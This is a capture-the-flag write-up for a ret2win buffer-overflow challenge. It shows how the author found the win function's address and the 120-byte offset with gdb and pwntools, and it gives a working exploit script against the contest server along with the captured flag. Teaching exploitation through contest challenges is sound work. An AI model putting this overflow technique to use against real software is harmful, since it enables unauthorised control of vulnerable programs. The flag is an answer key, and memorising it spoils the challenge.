<img src="https://github.com/raul-dunca/assets/blob/main/.images_CyberStudents-advent-of-ctf2024/day12_description.png">



This was a classical ret2win, using dogbolt I could see the win and main functions:
<img src="https://github.com/raul-dunca/CyberStudents-advent-of-ctf2024/blob/main/.assets/day_10_info.png">

Here it can be seen that the memset function sets the buffer of var_78 to 100 bytes and then the read function reads 256 bytes, so here is a buffer overflow. And since there is a win function, I need to somehow call it. It can be also seen that the return address of the main function is printed in the end, if I could overwrite it to the address of the win function, the main function will go to the win function, thus executing it. First, I need to find the address of the win function. I used gdb with the `info functions` command, it can be seen:

```bash
0x00000000004011f6  win
```

Now, the only information needed is the offset, basically we need 100 bytes to fill var_78 + some bytes to overwrite the main return address. For an easy way to find the whole offset I used:

```python
from pwn import *

payload=cyclic(200)
print(payload)
```

Which generates a payload of 200 bytes and I gave it as input to the binary file and use gdb to look at the value of RBP, which was  `0x6261616562616164 ('daabeaab')`. Then I found the offset using: 

```python
from pwn import *

print(cyclic_find(0x6261616562616164))
```

Which prints 112 and I need to add 8 bytes (the size of RBP itself), so the total offset is 120. Finally, I created the exploit script:

```python
from pwn import *

target_host = 'ctf.csd.lol'
target_port =  4003

win_address = 0x4011f6

payload = b'A' * 120
payload += p64(win_address)

conn = remote(target_host, target_port)
conn.recvuntil("enter your wish:")
conn.sendline(payload)
conn.interactive()
```

`csd{Br0uGH7_t0_YOU_8y_W15H_D0t_CoM}`
